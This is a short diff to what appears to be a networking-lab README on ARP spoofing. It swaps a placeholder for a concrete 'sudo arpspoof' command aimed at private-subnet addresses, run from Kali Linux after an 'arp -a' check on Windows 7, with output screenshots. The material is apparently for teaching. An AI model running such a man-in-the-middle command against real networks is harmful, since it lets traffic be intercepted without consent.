@@ -27,7 +27,8 @@ In windows 7 give the command arp -a
 ![image](https://github.com/user-attachments/assets/6390f175-69ec-47c3-b9cc-23493d165f08)
 
 From kali linux issue the command :
-sudo arpspoof -i eth0 -t <target system> <gateway>
+
+sudo arpspoof -i eth0 -t 192.168.66.60 192.168.66.132
 ## OUTPUT:
 ![image](https://github.com/user-attachments/assets/46bd453a-9cdd-40b6-8389-49373cb04c55)
 
